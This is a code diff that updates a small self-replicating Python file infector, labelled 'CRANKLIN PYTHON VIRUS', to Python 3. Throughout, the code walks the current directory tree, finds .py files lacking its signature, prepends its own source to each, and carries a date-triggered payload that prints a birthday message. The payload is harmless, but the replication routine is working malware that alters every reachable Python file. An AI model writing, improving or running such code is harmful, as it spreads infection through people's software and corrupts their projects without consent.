@@ -1,39 +1,51 @@
 #!/usr/bin/python
 import os
-import datetime
+import time
+
+
 SIGNATURE = "CRANKLIN PYTHON VIRUS"
+
+
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
     for fname in filelist:
-        if os.path.isdir(path+"/"+fname):
-            filestoinfect.extend(search(path+"/"+fname))
-        elif fname[-3:] == ".py":
+        fpath = os.path.join(path, fname)
+        if os.path.isdir(fpath):
+            filestoinfect.extend(search(fpath))
+        elif fname.endswith(".py"):
             infected = False
-            for line in open(path+"/"+fname):
+            for line in open(fpath):
                 if SIGNATURE in line:
                     infected = True
                     break
             if infected == False:
-                filestoinfect.append(path+"/"+fname)
+                filestoinfect.append(fpath)
     return filestoinfect
+
+
 def infect(filestoinfect):
     virus = open(os.path.abspath(__file__))
     virusstring = ""
-    for i,line in enumerate(virus):
-        if i>=0 and i <39:
-            virusstring += line
-    virus.close
+    for i, line in enumerate(virus):
+        virusstring += line
+        if line.strip() == "bomb()":
+            break
+    virus.close()
     for fname in filestoinfect:
         f = open(fname)
         temp = f.read()
         f.close()
-        f = open(fname,"w")
+        f = open(fname, "w")
         f.write(virusstring + temp)
         f.close()
+        
+        
 def bomb():
-    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
-        print "HAPPY BIRTHDAY CRANKLIN!"
+    if time.strftime("%m %d") == "01 25":
+        print("HAPPY BIRTHDAY CRANKLIN!")
+
+
 filestoinfect = search(os.path.abspath(""))
 infect(filestoinfect)
 bomb()
